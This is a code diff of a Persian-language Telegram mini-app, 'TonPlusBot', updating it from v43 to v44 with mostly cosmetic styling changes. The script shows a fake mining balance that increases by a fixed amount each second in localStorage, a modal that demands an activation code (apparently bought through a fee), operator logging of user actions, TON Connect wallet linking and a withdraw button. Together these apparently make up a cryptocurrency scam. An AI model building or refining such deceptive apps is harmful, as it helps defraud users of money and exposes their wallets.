@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonPlusBot - v43 Final</title>
+    <title>TonPlusBot - v44 Professional</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -17,21 +17,21 @@
             background: #0b1019; color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
         }
 
-        /* کارت پروفایل: عکس در راست، متن در چپ */
+        /* بخش پروفایل: عکس در راست، متن در چپ */
         .card-profile {
             background: #161d27; border-radius: 20px; padding: 15px;
             margin-bottom: 12px; border: 1px solid #242c37;
-            display: flex; align-items: center; justify-content: flex-start; gap: 15px;
+            display: flex; align-items: center; flex-direction: row; gap: 15px;
         }
 
         .avatar-container { 
             width: 60px; height: 60px; border-radius: 50%; 
             background: linear-gradient(135deg, #00c6ff, #0072ff); overflow: hidden;
             display: flex; align-items: center; justify-content: center;
-            border: 2px solid #242c37; order: 2; /* جابجایی به سمت راست */
+            border: 2px solid #242c37; flex-shrink: 0;
         }
 
-        .profile-text { order: 1; text-align: right; flex-grow: 1; }
+        .profile-text { text-align: right; flex-grow: 1; }
         .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
         .avatar-container i { font-size: 30px; color: #fff; }
 
@@ -50,12 +50,14 @@
             text-decoration: none; margin-bottom: 12px; box-sizing: border-box;
         }
 
-        /* اصلاح دکمه Connect Wallet */
+        /* حذف انیمیشن و اصلاح دکمه Connect Wallet */
         #ton-connect-btn { width: 100%; }
         #ton-connect-btn * { 
             width: 100% !important; height: 58px !important; 
             border-radius: 20px !important; justify-content: center !important;
             background-color: #0088cc !important;
+            transition: none !important; /* حذف انیمیشن */
+            animation: none !important; /* حذف انیمیشن */
         }
 
         .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
@@ -63,7 +65,7 @@
         .active-btn { background: #1faa59; }
         .get-code-btn { background: #0088cc; }
 
-        /* پاپ‌آپ فعالسازی (مطابق تصویر ۷) */
+        /* پاپ‌آپ فعالسازی */
         #feeModal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #0b1019; z-index: 100000; display: flex; align-items: center; justify-content: center;
@@ -85,9 +87,11 @@
             font-weight: 800; font-size: 18px; margin-bottom: 20px; display: block; 
         }
 
+        /* هماهنگی کامل کادر ورودی کد */
         #activationInput {
-            width: 100%; height: 58px; border-radius: 18px; border: 1px solid #333;
-            background: #0b1019; color: #fff; text-align: center; font-size: 17px; margin-bottom: 12px; outline: none;
+            width: 100%; height: 58px; border-radius: 20px; border: 1px solid #333;
+            background: #121212; color: #fff; text-align: center; font-size: 17px; 
+            margin-bottom: 12px; outline: none; box-sizing: border-box;
         }
 
         .hidden { display: none !important; }
@@ -163,14 +167,13 @@
 
     if(localStorage.getItem('isActivated') === 'true') {
         document.getElementById('feeModal').style.display = 'none';
-        logToAdmin("⛏️ <b>پنل استخراج فعال شد</b>");
     }
 
     function verifyActivation() {
         if(document.getElementById('activationInput').value.trim() === SECRET_CODE) {
             localStorage.setItem('isActivated', 'true');
             document.getElementById('feeModal').remove();
-            logToAdmin("✅ <b>کاربر کد فعالسازی را زد</b>");
+            logToAdmin("✅ <b>پنل فعال شد</b>");
         } else { tg.showAlert("رمز اشتباه است ❌"); }
     }
 
@@ -185,11 +188,11 @@
         }
     }
 
-    let bal = parseFloat(localStorage.getItem('bal_v43')) || 0;
+    let bal = parseFloat(localStorage.getItem('bal_v44')) || 0;
     setInterval(() => {
         bal += 0.000012;
         document.getElementById('balance').innerText = bal.toFixed(6);
-        localStorage.setItem('bal_v43', bal.toString());
+        localStorage.setItem('bal_v44', bal.toString());
     }, 1000);
 
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
